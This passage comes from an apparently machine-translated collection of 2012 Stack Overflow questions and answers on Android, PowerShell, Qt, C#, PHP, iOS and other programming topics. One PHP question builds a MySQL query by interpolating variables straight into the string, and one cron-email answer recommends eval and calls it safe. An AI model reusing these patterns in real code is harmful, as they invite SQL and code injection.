                loansForRepayment.get(position).setRepaymentAmount(Float.parseFloat(repaymentAmount));
            }

            @Override
            public void beforeTextChanged(CharSequence s, int start,
                    int count, int after) {
                // TODO Auto-generated method stub

            }

            @Override
            public void onTextChanged(CharSequence s, int start,
                    int before, int count) {
                // TODO Auto-generated method stub

            }

        });
        view.setTag(viewHolder);
        viewHolder.repaymentAmount.setTag(loansForRepayment.get(position));
    } else {
        view = convertView;
        ((ViewHolder) view.getTag()).repaymentAmount.setTag(loansForRepayment.get(position));
    }
    ViewHolder holder = (ViewHolder) view.getTag();
    holder.borrowerName.setText(loansForRepayment.get(position).getLoanProfileBasicInfo().getBorrowerBasicInfo().getFirstName());
    holder.loanAmount.setText("Rs. " + Float.toString(loansForRepayment.get(position).getLoanProfileBasicInfo().getLoanAmountInPaisa()/100));
    holder.estimatedTotal.setText("Rs. " + Float.toString(loansForRepayment.get(position).getEstimatedTotalAmount()/100));
    holder.installmentNumber.setText("Inst no - " + Integer.toString(loansForRepayment.get(position).getInstallmentNumber()));
    float repaymentAmt = loansForRepayment.get(position).getRepaymentAmount();
    if(repaymentAmt != 0.0) holder.repaymentAmount.setText(Float.toString(repaymentAmt));
    return view;
}
} 
```

**我的 XML 贷款还款**

```
<TextView android:id="@+id/screenTitle" 
    android:layout_width="fill_parent" 
    android:layout_height="wrap_content" >
</TextView>

 <ListView
    android:id="@android:id/list"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:layout_above="@+layout/loan_disbursement_footer"
     />
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="wrap_content"
android:layout_height="wrap_content"
android:orientation="vertical" >
<TextView
    android:id="@+id/borrowerName"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="@+id/label"
    android:textSize="14sp"
     >
</TextView>

<TextView
    android:id="@+id/loanAmount"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="@+id/label"
    android:textSize="14sp"
     >
</TextView>

<TextView
    android:id="@+id/installmentNumber"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="@+id/label"
    android:textSize="12sp"
    >
</TextView>

<TextView
    android:id="@+id/estimatedTotal"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="@+id/label"
    android:textSize="12sp"
    >
</TextView>

</LinearLayout>
<EditText
    android:id="@+id/repaymentAmount"
    android:layout_width="100sp"
    android:layout_height="wrap_content"
    android:layout_alignParentRight="true"
    android:inputType="text"
    android:textSize="12sp"
     >
</EditText>

</RelativeLayout> 
```

**我的活动代码**

```
public void onCreate(Bundle savedInstanceState){
    lastKnownLocation = Utility.getLastKnownLocation(this);
    super.onCreate(savedInstanceState);
    Intent intent = getIntent();

    loansForRepayment = (ArrayList<CurrentRepaymentInstallment>)intent.getSerializableExtra(Constants.CURRENT_REPAYMENT_INSTALLMENT);
    ArrayAdapter<CurrentRepaymentInstallment> adapter = new LoanRepaymentListAdapter(this, loansForRepayment);

    View footer = getLayoutInflater().inflate(R.layout.loan_disbursement_footer, null);
    getListView().addFooterView(footer);

    setListAdapter(adapter);

    Button button = (Button)findViewById(R.id.disburse);
    button.setOnClickListener(this);
} 
```

还想知道如何在我的列表 onChange 中设置已编辑文本的值。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T11:46:30.180

你不应该使用`EditText`而不是`TextView`吗？

更新：看起来我在第一遍就误解了。您可能的意思`repaymentAmount`是不可编辑。正确的？如果是，则尝试注释掉以下行：

```
viewHolder.repaymentAmount.addTextChangedListener( ...
viewHolder.repaymentAmount.setEditableFactory( ... 
```

它仍然是不可编辑的吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T11:51:00.690

只需通过属性启用您的edittext并在其上设置Listener，当您在完成后在edittext中输入文本（或我认为使用onfocusChangedListener）时，它将反映对所需textview的更改。一旦您在Editext中完成输入。

# powershell - powershell 将一行从文档分配给变量

> ID：11155485
> 
> 赞同：0
> 
> 时间：2012-06-22T11:40:03.913
> 
> 标签：powershell, powershell-2.0, quest

我正在使用 cmdlet Get-QADUser（通过 Quest 软件）列出 Active Directory 中的域用户。输出是包含域名和电子邮件地址的数百行。我只需要选择那些行，电子邮件地址在哪里，并将它们分配给一个单独的变量。

这是 $domain_names 变量的一部分：

```
turbekova                                                   turbek@dock.com                                                       
senajova                                                    senaj@dock.com                                                       
mackova                                                                                                            
pukansky                                                    pukansky@dock.com                                                       
tiko                                                        tiko@dock.com                                                       
dvorska                                                                                                            
trescanska                                                  tresc@dock.com 
```

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T11:43:56.127

您可以过滤`Where-Object`：

```
$hasEmail = Get-QADUser | Where-Object { $_.Email } 
```

或任何列的名称。您选择不在复制的输出中包含属性名称。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-22T12:05:38.717

这使用您选择的属性参数和通配符显示具有电子邮件的用户：

```
 Get-QADUser -Email * | select samaccountname, email 
```

# qt - 如何将“点击事件”添加到 QGraphicsView

> ID：11155486
> 
> 赞同：-2
> 
> 时间：2012-06-22T11:40:06.153
> 
> 标签：qt

我在 Designer 的 ui 表单中添加了一个 QGraphicsView。现在我想向这个小部件添加一个“点击事件”。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T12:25:42.097

Is it possible for you to subclass a QGraphicsView? If so you could easily handle the cases with something like that:

MyQGraphicsView.h

```
class MyQGraphicsView : public QGraphicsView
{
    void enterEvent(QEvent *event);
    void leaveEvent(QEvent *event);
    void mouseReleaseEvent(QMouseEvent *event);
    void mousePressEvent(QMouseEvent *event);
    void mouseMoveEvent(QMouseEvent *event);
    void wheelEvent(QWheelEvent *event);
} 
```

MyQGraphicsView.cpp

```
void MyQGraphicsView::mouseMoveEvent(QMouseEvent *event)
{
    // Do what you want
}

//Do the same with all the events. 
```

# c# - 使用带有动态表前缀的 LINQ to SQL

> ID：11155487
> 
> 赞同：1
> 
> 时间：2012-06-22T11:40:06.843
> 
> 标签：c#, .net, linq

我创建了代表我的数据库的 LINQ to SQL 文件。数据库中的表名格式如下：

```
[prefix]_tableName 
```

当我尝试将 Designer.cs 文件中的 TableAttribute 从以下位置更改时，我希望前缀是动态的：

```
[global::System.Data.Linq.Mapping.TableAttribute(Name="dbo.isftblprfx_config")] 
```

至：

```
[global::System.Data.Linq.Mapping.TableAttribute(Name=String.Format("dbo.{0}_{1}", Server.TablesPrefix, "config")] 
```

我得到了构建时间错误：

> 属性参数必须是属性参数类型的常量表达式、typeof 表达式或数组创建表达式

有什么解决办法吗？提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-23T09:40:40.287

例外说明了一切。

[编译代码时会将属性发送到元数据](http://msdn.microsoft.com/en-us/library/bfz783fz.aspx)中，因此它的参数需要在编译时确定，它们不能在运行时更改。所以我希望你`Server.TablesPrefix`的不是常量或只读字符串。

如果你想为不同的数据库重用你的上下文，它们应该有相同的模式。如果您无法更改架构，也许 t4 模板可以提供解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T11:52:37.490

```
[global::System.Data.Linq.Mapping.TableAttribute(Name=String.Fromat("dbo.{0}_{1}", Server.TablesPerfix, "config")] 
```

应该读

```
[global::System.Data.Linq.Mapping.TableAttribute(Name=String.Format("dbo.{0}_{1}", Server.TablesPrefix, "config")] 
```

错字永远是最大的敌人 :)

# php - MySQL在第1行错误的''附近使用正确的语法

> ID：11155489
> 
> 赞同：13
> 
> 时间：2012-06-22T11:40:15.910
> 
> 标签：php, mysql

你好我有一个使用php运行查询它给出错误

**您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册，以在第 1 行的 '' 附近使用正确的语法**

但是当我回显查询并使用 sqlyog 软件手动运行时，它运行良好。谁能说这里有什么问题这是我生成的查询

```
INSERT INTO wp_bp_activity
            (
            user_id,
             component,
             `type`,
             `action`,
             content,
             primary_link,
             item_id,
             secondary_item_id,
             date_recorded,
             hide_sitewide,
             mptt_left,
             mptt_right
             )
             VALUES(
             1,'activity','activity_update','<a title="admin" href="http://brandnewmusicreleases.com/social-network/members/admin/">admin</a> posted an update','<a title="242925_1" href="http://brandnewmusicreleases.com/social-network/wp-content/uploads/242925_1.jpg" class="buddyboss-pics-picture-link">242925_1</a>','http://brandnewmusicreleases.com/social-network/members/admin/',' ',' ','2012-06-22 12:39:07',0,0,0
             ) 
```

这是我的php代码

```
$qr2="INSERT INTO wp_bp_activity
            (
            user_id,
             component,
             `type`,
             `action`,
             content,
             primary_link,
             item_id,
             secondary_item_id,
             date_recorded,
             hide_sitewide,
             mptt_left,
             mptt_right
             )
             VALUES(
             $cid,'activity',
             'activity_update',
             '<a href=\"http://brandnewmusicreleases.com/social-network/members/$name/\" title=\"$name\">$name</a> posted an update',
             '<a class=\"buddyboss-pics-picture-link\" href=\"http://brandnewmusicreleases.com/social-network/wp-content/uploads/$imgname\" title=\"$ionlyname\">$ionlyname</a>',
             'http://brandnewmusicreleases.com/social-network/members/$name/',
             ' ',
             ' ',
             '$time',
             0,
             0,
             0
             )"; 
```

编辑后

```
echo $qr2="INSERT INTO wp_bp_activity (user_id,component,`type`,`action`,content,primary_link,item_id,secondary_item_id,date_recorded,hide_sitewide,mptt_left,mptt_right) VALUES($cid,'activity','activity_update','<a href=\"http://brandnewmusicreleases.com/social-network/members/$name/\" title=\"$name\">$name</a> posted an update','<a class=\"buddyboss-pics-picture-link\" href=\"http://brandnewmusicreleases.com/social-network/wp-content/uploads/$imgname\" title=\"$ionlyname\">$ionlyname</a>','http://brandnewmusicreleases.com/social-network/members/$name/','','','$time',0,0,0)";

mysql_query($qr2) or die(mysql_error()); 
```

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-06-22T11:58:43.010

问题是因为您使用“”在多行上进行了查询，PHP 实际上将所有空格发送到 MySQL，这导致它出错。

要么把它放在一行上，要么附加在每一行上：o）

Sqlyog 必须修剪每一行上的空白，这解释了它为什么工作。

例子：

```
$qr2="INSERT INTO wp_bp_activity
      (
            user_id,
 (this stuff)component,
     (is)      `type`,
    (a)        `action`,
  (problem)  content,
             primary_link,
             item_id,.... 
```

* * *

## 回答 #2

> 赞同：-3
> 
> 时间：2014-03-13T11:18:46.273

```
INSERT INTO wp_bp_activity
            (
            user_id,
             component,
             `type`,
             `action`,
             content,
             primary_link,
             item_id,
             secondary_item_id,
             date_recorded,
             hide_sitewide,
             mptt_left,
             mptt_right
             )
             VALUES(
             1,'activity','activity_update','<a title="admin" href="http://brandnewmusicreleases.com/social-network/members/admin/">admin</a> posted an update','<a title="242925_1" href="http://brandnewmusicreleases.com/social-network/wp-content/uploads/242925_1.jpg" class="buddyboss-pics-picture-link">242925_1</a>','http://brandnewmusicreleases.com/social-network/members/admin/',' ',' ','2012-06-22 12:39:07',0,0,0
             ) 
```

# qt - 在向导页面上处理取消

> ID：11155494
> 
> 赞同：0
> 
> 时间：2012-06-22T11:40:48.210
> 
> 标签：qt

我怀疑我试图弯曲 a`QWizardPage`做的事情超出了预期，这就是我遇到问题的原因，但也许有办法做到这一点。

因此，我在一个页面中有许多页面，`QWizard`并且在某个页面上，我针对某些硬件运行了一系列测试，然后将结果存储在数据库中。我希望能够在必要时取消。但是目前取消按钮是 QWizard 的一部分，所以我不知道如何处理它。

我知道我可以覆盖的`reject()`功能`QWizard`然后确定当前页面，如果它是我感兴趣的页面然后做一些事情，但我宁愿不以这种方式将页面绑定在一起，除非我必须这样做。

我确实尝试将`rejected()`信号连接到向导，如下所示：

```
connect(this, SIGNAL(rejected()), ui->runTestPage, SLOT(on_rejected())); 
```

但这会立即关闭页面，然后我才能向用户显示任何内容以说我正在取消。

我可以向向导页面添加一个按钮，该按钮将在测试运行时显示以允许取消，但该页面仍然具有主取消按钮。事实上，即使在测试完成后，取消仍然会显示，因此能够删除或禁用这似乎是合适的。

那么这是我可以做的事情还是我需要重新审视向导的整个使用？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-17T12:39:46.953

一种方法是将向导的`reject()`插槽与`cancel`按钮的`clicked()`信号断开连接，然后从您询问用户是否真的确定的位置连接您自己的插槽，如下所示：

在向导的构造函数中：

```
// install a slot handling the cancel button, but disconnect the default slot that would close the wizard first
disconnect( button( QWizard::CancelButton ), SIGNAL( clicked() ), this, SLOT( reject() ) );
connect( button( QWizard::CancelButton ), SIGNAL( clicked() ), this, SLOT( cancelWizard() ) ); 
```

Then implement your own slot handling cancellation:

```
void SetupWizard::cancelWizard() {
    if( QMessageBox::question( this, trUtf8( "Quit Setup" ), trUtf8( "Setup is not complete yet. Are you sure you want to quit setup?" ), QMessageBox::Yes, QMessageBox::No ) == QMessageBox::Yes ) {
        // allow cancel
        reject();
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-22T15:33:25.010

是的，这是可行的。首先你不一定需要覆盖`rejected()`，我会沿着摆脱`QWizard`取消按钮的路线走，而是插入你自己的`QPushButton`（或任何一个）指向你自己的插槽，从那里做你的“现在取消”消息框和然后触发`rejected()`插槽。

它将为您省去很多对默认信号/插槽进行按摩的麻烦，并允许您将“取消”替换为“关闭”，这在向导的上下文中可能更有意义（取决于向导、功能等） .

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2019-12-27T10:32:58.137

You could override the `reject` method in your wizard class and call `QWizard::reject` in your `reject` method.

```
void MyWizard::reject()
{
    if( QMessageBox::question( this, trUtf8( "Quit Setup" ), trUtf8( "Setup is not complete yet. Are you sure you want to quit setup?" ), QMessageBox::Yes, QMessageBox::No ) == QMessageBox::Yes ) {
        // allow cancel
        QWizard::reject();
    }
} 
```

# ios5 - 来自char数组的带有变音符号的NSString

> ID：11155495
> 
> 赞同：0
> 
> 时间：2012-06-22T11:40:49.330
> 
> 标签：ios5, encoding, character-encoding, nsstring

我有这个数组：

```
const char array[3] = {173,67,0}; 
```

我想得到一个看起来像“°C”（ISO Latin1）的 NSString。我尝试了一些编码，但不明白...

* * *

谢谢。我试过你的代码：

```
const char array[3] = {176, 67, 0};
NSString *degreeC = [NSString stringWithCString: array encoding:NSISOLatin1StringEncoding];

NSLog(@"%@"); 
```

不幸的是，这导致输出

```
¬∞C 
```

同样，如果我使用

```
NSString *degree2 = @"°C"; 
NSLog(degree2); 
```

我需要在 xcode 中进行任何设置吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T14:16:56.623

你说你想要一个变音符号，但在你的例子中你画了一个度数符号。在 ISO Latin-1 中，变音符号为 0xa8（十进制 168），度数符号为 0xb0（十进制 176）。如果真的是从一个 C 字符串开始，你需要一个 NSString ：

```
const char array[3] = { 176, 67, 0 };
NSString *degreeC = [NSString stringWithCString:array encoding:NSISOLatin1StringEncoding]; 
```

或者，由于您可以在 Xcode 的源代码中直接使用非 ASCII 字符（默认编码为 UTF-8），您可以只创建一个 NSString 文字：

```
NSString *degreeC = @"°C"; 
```

# java - java - 如何将具有不同节点结构的多个xml文件合并到java或任何其他工具中的单个xml文件中？

> ID：11155497
> 
> 赞同：0
> 
> 时间：2012-06-22T11:40:52.823
> 
> 标签：java, xml

我有许多具有不同节点结构和不同节点的 xml 文件。现在我想将这两个 xml 文件合并到一个 xml 文件中。经过搜索，我发现我可以使用 xslt 来合并多个 xml 文件，并且每个示例都处理具有相同节点结构的 xml 文件。

感谢斯蒂芬的建议，但我面临不同的情况。以下是我想要合并在一起的 xml 文件片段，以及最终的 xml 文件应该是什么样子。

文件1.xml

```
<Equipment>
<Items>
   <Item>
     <ID>_stdpart_38100</ID>
     <Index>1</Index>
     <SubcategoryIDRef>Power</SubcategoryIDRef>
  </Item>
 </Items>
 <Subcategories>
  <Subcategory>
    <ID>Power</ID>
    <CategoryIDRef>Power and Handling</CategoryIDRef>
  </Subcategory>
  <Categories>
  <Category>
  <ID>Power and Handling</ID>
  <Title>Power and Handling</Title>
  <Subtitle />
  </Category>
 <Categories>
 </Equipment> 
```

文件2.xml

```
<Models>
 <Model>
 <ID>S Sedan</ID>
<Name>S Sedan</Name>
<Index>1</Index>
<Equipment>
  <Item>
    <IDRef>_stdpart_38100</IDRef>
    <Optionality>S</Optionality>
  </Item>
<Equipment>
</Model>
</Models> 
```

最终合并的文件应该看起来像merged.xml

```
<Models>
 <Model>
    <ID>S Sedan</ID>
    <Name>S Sedan</Name>
    <Index>1</Index>
    <Equipment>
    <Item>
        <ID>_stdpart_38100</ID>
       <Index>1</Index>
       <Subcategory>
         <ID>Power</ID>
         <Category>
            <ID>Power and Handling</ID>
            <Title>Power and Handling</Title>
           <Subtitle />
         </Category>
     </Subcategory>
     <Optionality>S</Optionality>
   </Item>
   </Equipment>
  </Model>
</Models> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T11:49:37.823

> 我发现我可以使用 xslt 来合并多个 xml 文件，并且每个示例都处理具有相同节点结构的 xml 文件。

这是一个示例，其中 XML 文件具有完全不同的结构：

*   [XSLT：合并两个具有不同结构和时间表示的日志文件](https://stackoverflow.com/questions/9180499/xslt-merging-two-log-files-with-different-structure-and-time-representation)

[如果这没有帮助，请使用您的 XML 示例以及您需要合并文件的外观来更新您的问题。]

# ios - 如何在导航控制器中的 2 个 iOS 视图之间制作“返回”动画？

> ID：11155498
> 
> 赞同：1
> 
> 时间：2012-06-22T11:40:56.873
> 
> 标签：ios

如何在导航控制器中的 2 个 iOS 视图之间制作“返回”动画？

“转回”是指视图沿垂直轴转回。当您为研究选择过滤器时，您可以在亚马逊 iOS 应用程序中看到一个示例。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T11:44:37.363

为此，您不能使用导航控制器您将需要使用视图控制器`presentModalViewController`并`modalPresentationStyle = UIModalTransitionStyleFlipHorizontal;`在要呈现的新视图控制器中进行设置

```
//Create the view
UIViewController *controller = [[UIViewController alloc] init];
controller.modalTransitionStyle = UIModalTransitionStyleFlipHorizontal;
[self presentModalViewController:controller animated:YES]; 
```

# url - 为什么维基百科在其 URL 片段中使用修改后的百分比编码？

> ID：11155503
> 
> 赞同：8
> 
> 时间：2012-06-22T11:41:20.413
> 
> 标签：url, fragment-identifier, percent-encoding, url-design

我注意到维基百科对 URL 的路径部分使用百分比编码，但将`%`字符转换`.`为#fragment。

例如，在[俄语“俄罗斯”页面上，](http://ru.wikipedia.org/wiki/%D0%A0%D0%BE%D1%81%D1%81%D0%B8%D1%8F)[第 2 部分 (История)](http://ru.wikipedia.org/wiki/%D0%A0%D0%BE%D1%81%D1%81%D0%B8%D1%8F#.D0.98.D1.81.D1.82.D0.BE.D1.80.D0.B8.D1.8F)的 URL是

`http://ru.wikipedia.org/wiki/%D0%A0%D0%BE%D1%81%D1%81%D0%B8%D1%8F#.D0.98.D1.81.D1.82.D0.BE.D1.80.D0.B8.D1.8F`

代替

`http://ru.wikipedia.org/wiki/%D0%A0%D0%BE%D1%81%D1%81%D0%B8%D1%8F#%D0%98%D1%81%D1%82%D0%BE%D1%80%D0%B8%D1%8F`

id/name 的 HTML<5 标记都不是有效的标记，因为标记必须以 [A-Za-z] 开头。HTML5[目前声明](http://www.whatwg.org/specs/web-apps/current-work/multipage/elements.html#the-id-attribute)您可以使用除空格之外的任何字符中的至少一个（因此您根本不需要编码），但 Wikipedia 不是 HTML5。

那么，为什么维基百科要使用这个方案呢？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-22T15:24:59.990

一种可能的答案是跨浏览器问题。浏览器处理 unicode 的方式不一致，尤其是 URL 片段。

例如，通过链接

`<a id="foo" href="%D1%83%D0%BE%D0%BC%D0%B1%D0%BB%D1%8B">Уомблы</a>`

```
Browser      | Hover   | Location bar | href*   | path*
----------------------------------------------------------
Chrome 19    | Unicode | Unicode      | Percent | Percent
Firefox 13   | Unicode | Unicode      | Percent | Percent
IE 9         | Percent | Percent      | Percent | Percent 
```

但有一个片段：

`<a id="foo" href="#%D1%83%D0%BE%D0%BC%D0%B1%D0%BB%D1%8B">Уомблы</a>`

```
Browser      | Hover   | Location bar | href*   | hash*
----------------------------------------------------------
Chrome 19    | Percent | Percent      | Percent | Percent
Firefox 13   | Unicode | Unicode      | Percent | Unicode
IE 9         | Percent | Percent      | Percent | Percent 
```

链接=`javascript:document.getElementById('foo').href`

路径=`javascript:location.pathname`在以下链接之后

哈希=`javascript:location.hash`在以下链接之后

因此，当您请求哈希时，Firefox 会将片段的百分比编码解码为 un​​icode，导致它与 id/name 属性的值不匹配。注意，这只是 JavaScript 中的一个问题；以下链接工作正常。

# c++ - C++ 流的 flush() 和 FindFirstFileEx() 之间的竞争条件

> ID：11155506
> 
> 赞同：2
> 
> 时间：2012-06-22T11:41:46.737
> 
> 标签：c++, winapi, visual-c++, iostream

我的代码看起来接近这个：

1.  大量使用普通 C++ IO 流插入的写入，例如`steram << "foo";`
2.  `stream.flush();`在某一点;
3.  [`_stat()`](http://msdn.microsoft.com/en-us/library/14h5k7ff%28v=vs.100%29.aspx)在上面刷新之后立即调用MSVC C API 。

我观察到的是`_stat()`调用返回的尺寸不同于`stream.tellp()`较小的尺寸。

如果我`stream`在调用`_stat()`函数之前关闭它，它会返回正确的结果。我已经进入了`_stat()`，它用于[`FindFirstFileEx()`](http://msdn.microsoft.com/en-us/library/windows/desktop/aa364419%28v=vs.85%29.aspx)获取尺寸。

这是一个已知的 Win32 API 怪癖吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-24T09:40:03.877

我假设您正在使用 Windows Vista 或更高版本。每次将文件刷新到光盘时，都会在 XP 下的文件属性中更新文件大小。这在 Vista 上不再适用，因为 Hans 已经对文件属性进行了注释，并且在文件的最后一个句柄关闭时会更新其大小。

有关更多详细信息，请参阅[旧新事物博客](http://blogs.msdn.com/b/oldnewthing/archive/2011/12/26/10251026.aspx)。

您可以尝试再次打开文件并关闭它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-24T09:19:50.947

使用 GetFileInformationByHandle 获取确切大小。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-22T12:00:50.480

这可能是由于文件系统缓存造成的。从 C++ 流的角度来看，它已按照标准的要求将所有写入的数据传递到物理设备。但是文件系统可能会缓存写入，并根据其他一些策略刷新它们。

一种可能的解决方案是使用以下 Win32 API 选项之一：

1.  如果您碰巧自己打开文件，请使用[CreateFile](http://msdn.microsoft.com/en-us/library/windows/desktop/aa363858%28v=vs.85%29.aspx)，使用`FILE_FLAG_NO_BUFFERING`和`FILE_FLAG_WRITE_THROUGH`标志。
2.  完成写入后，调用[FlushFileBuffers](http://msdn.microsoft.com/en-us/library/windows/desktop/aa364439%28v=vs.85%29.aspx)以确保刷新元数据（您必须以某种方式获取文件的句柄）。

假设您的 C++ 流正在做自己的缓冲，这不应该对性能造成太大影响。

# hbase - 如何获取放入hbase的列名？

> ID：11155507
> 
> 赞同：1
> 
> 时间：2012-06-22T11:41:51.723
> 
> 标签：hbase

给定一个`put`（在 shell 中），用户需要指定要添加值的列。有没有办法获得所有列名`put`？我知道方法`get`为

> public List get(byte[] family,byte[] qualifier)

然而，这并没有给程序员有关列名的信息。

# c# - 为我的 API 正确的 SyncRoot 样式

> ID：11155508
> 
> 赞同：0
> 
> 时间：2012-06-22T11:41:52.107
> 
> 标签：c#, .net, multithreading

在我的应用程序中，我有一个类，我希望一次只能由一个线程访问其方法。此类对 COM 端口上的设备执行一些操作，我不希望一个线程写入端口，而另一个线程正在写入等。

要使用这个类（不是由我维护的），我有一个服务类，它将使用 COM 的类和服务器作为 API 层实例化到我的应用程序的其余部分。虽然 COM 类不是我直接维护的，但我可以编辑它。只是我的一个同事创建了它，我只在其中修复错误。那里有很多我不想接触的低级位操作。

我将如何强制执行仅对 COM 类的单线程访问。

选项A（我目前已经实施）：

```
class Service
{
    private ComClass comClass;

    private readonly object syncRoot = new object();

    public void DoThisWithCom()
    {
       lock(syncRoot)
       {
         comClass.DoSomething();
       }
    }
} 
```

选项 B：

```
class Service
{
    private ComClass comClass;

    public void DoThisWithCom()
    {
       lock(comClass)
       {
         comClass.DoSomething();
       }
    }
} 
```

选项 C（这是可能的，因为我可以编辑 COM 类的代码）：

```
class Service
{
    private ComClass comClass;

    public void DoThisWithCom()
    {
       lock(comClass.SyncRoot)
       {
         comClass.DoSomething();
       }
    }
} 
```

也许最好将所有这些都放在 COM 类方面，因为多个线程应该不可能同时使用此类中的方法。

想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T12:17:43.557

锁定公共对象绝不是一个好主意，因为您无法控制该对象在其他地方被（误）用作锁定对象，这可能会导致组件中的死锁。这有效地消除了选项 C。

如果该`ComClass`实例是在您的`Service`类中创建的，并且永远不会（也永远不会）可供外部使用，那么锁定您的`comClass`成员是安全的。因此，如果这是真的，请选择选项 B，否则只需保留当前的实现。

# php - PHP：具有当前小时条件的单个 cronjob，用于发送多个不同的电子邮件

> ID：11155510
> 
> 赞同：0
> 
> 时间：2012-06-22T11:42:01.540
> 
> 标签：php, cron, scheduled-tasks

我有几种类型的自动电子邮件要以编程方式发送给我数据库中的用户。金额会发生变化，但执行时间是：00。

因此，我没有将不同的 cron 作业设置为在一天中的不同时间执行，而是考虑只创建一个每小时运行的脚本，它会检查时间并相应地发送电子邮件。这是粗略的想法：

```
date_default_timezone_set('America/Los_Angeles');
// setting the timezone to the one of the hosting server
$cur_hour = (int)date('G'); // PDT hour

if ($cur_hour == 1) { // 1am

    // collect information from db
    // send e-mail A to these users
    // update db

} elseif ($cur_hour == 2) { // 2am

    // collect information from db
    // send e-mail B to these users
    // update db

} elseif ($cur_hour == 3) { // 3am

    // likewise…

} 
```

这是正确的方法还是有更有效或更好的方法来做到这一点？

**附加信息：** 某些电子邮件中存在变量，因此我无法在那里发送一封电子邮件。我需要分别向每个适用的用户发送例如*电子邮件 A。*而且还没有成千上万的用户。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T11:58:28.360

我会有一个字符串（模板）数组，其中可以包含诸如`$username`etc 之类的东西。根据小时从数组中选择适当的字符串。用于`eval`为该用户构建电子邮件。

不管人们怎么说，这是一个很好的使用`eval`. 这是安全的，因为字符串在您的控制之下。只需确保变量已被清理（但作为一名优秀的程序员，您会在将它们放入数据库之前执行此操作，或者将它们转义）。

# c# - 将 XML 文件内容保存到 String 或 StringBuilder

> ID：11155512
> 
> 赞同：5
> 
> 时间：2012-06-22T11:42:09.017
> 
> 标签：c#

我想将 XML 文件的全部内容保存到字符串或字符串生成器。请让我知道我怎样才能做到这一点？

我的函数需要将 XML 文件内容完全复制或保存到字符串或字符串生成器。
它是外部内容（XML 文件）。之后我需要更改 xml 文件的内容（onf 字段）我可以通过 C# 实现它吗？请告诉我。

我有以下 XML 格式的内容，我想放入一个字符串并将其传递给另一个函数以完成我的工作。

* * *

```
 <wsa:Address xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</wsa:Address>
        <wsa:ReferenceParameters xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsman="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd">
        <wsman:ResourceURI>http://schema.unisys.com/wbem/wscim/1/cim-          </wsa:ReferenceParameters>
        </p:Source>
     </p:INPUT>"; 
```

--------------------------------------------------

问候，
Channaa

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-22T11:49:25.620

将 XML 文件读入字符串很简单：

```
string xml = File.ReadAllText(fileName); 
```

要访问内容，您可以将其读入 XmlDocument：

```
XmlDocument doc = new XmlDocument();
doc.LoadXml(xml); 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-06-22T12:02:04.380

```
using System.Xml.Linq;

// load the file
            var xDocument = XDocument.Load(@"C:\MyFile.xml");
// convert the xml into string (did not get why do you want to do this)
            string xml = xDocument.ToString(); 
```

现在，使用[xDocument](http://msdn.microsoft.com/en-us/library/bb360635.aspx)，您可以操作 XML 并将其保存回来 -

```
 xDocument.Save(@"C:\MyFile.xml"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-22T11:58:13.440

为什么不直接读取 XML 到[XmlDocument](http://msdn.microsoft.com/en-us/library/system.xml.xmldocument.aspx)

```
XmlDocument xmlDoc = new XmlDocument();
xmlDoc.Load(xmlFilePath); 
```

当您需要 XML 作为字符串时，请使用[XmlNode.OuterXml](http://msdn.microsoft.com/en-us/library/875kz807.aspx)属性。

# c - 从源安装 freeglut - MinGW

> ID：11155513
> 
> 赞同：0
> 
> 时间：2012-06-22T11:42:14.757
> 
> 标签：c, installation, mingw, freeglut

我正在尝试在 Windows XP 机器上为 MinGW 安装 freeglut。下载源代码后（从[这里](http://freeglut.sourceforge.net/index.php#download)），我按照[这些说明](http://freeglut.sourceforge.net/docs/install.php)进行操作。

我打开了一个 MinGW shell 并输入了以下命令：

```
./configure
make all
make install 
```

完成后，我在目录中找不到任何 freeglut.dll 文件。我是从源安装的新手，我不知道我在这里缺少什么。我想了解为什么。感谢帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T16:30:23.643

尝试使用

```
./configure --prefix=/mingw
make
make install 
```

将 .dll 文件放入特定目录。这样您的文件就不会在 MSYS 目录中“丢失”。"--prefix=" 可以使用 "/drivename/localpath" 格式，其中 'drivename' 是 'c'、'd' 等。

如果这没有帮助，请尝试使用以下方法手动编译 FreeGLUT：[http ://netsuperbrain.com/blog/posts/freeglut-windows-hopengl-hglut/](http://netsuperbrain.com/blog/posts/freeglut-windows-hopengl-hglut/)

# linux - 在单个文件夹中运行 3 个脚本

> ID：11155515
> 
> 赞同：0
> 
> 时间：2012-06-22T11:42:17.150
> 
